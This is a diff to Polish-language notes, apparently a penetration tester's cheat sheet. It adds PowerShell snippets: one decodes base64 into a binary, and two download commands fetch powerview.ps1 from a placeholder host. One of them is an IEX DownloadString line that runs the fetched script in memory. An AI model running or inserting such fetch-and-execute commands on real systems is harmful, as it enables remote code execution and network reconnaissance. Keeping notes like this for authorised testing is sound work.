@@ -24,12 +24,19 @@ cat x* > scale_file
 ![](PodzielenieNaMniejszeFragmenty.png)
 
 
-
-# Dekodowanie base64 do binarki pliku powershell
+# Powershell
+### Dekodowanie base64 do binarki pliku powershell
 ```powershell
 $contentString = Get-Content $filePath -Encoding UTF8
 $binary = [Convert]::FromBase64String($contentString)
 Set-Content -Path $newFileName -Value $binary -Encoding Byte
+```
+### Komendy pobierania pliku
+```powershell
+IEX (New-Object System.Net.Webclient).DownloadString('http://ip/powerview.ps1')
+```
+```powershell
+iwr -uri http://ip/powerview.ps1 -OutFile pv.ps1
 ```
 
 
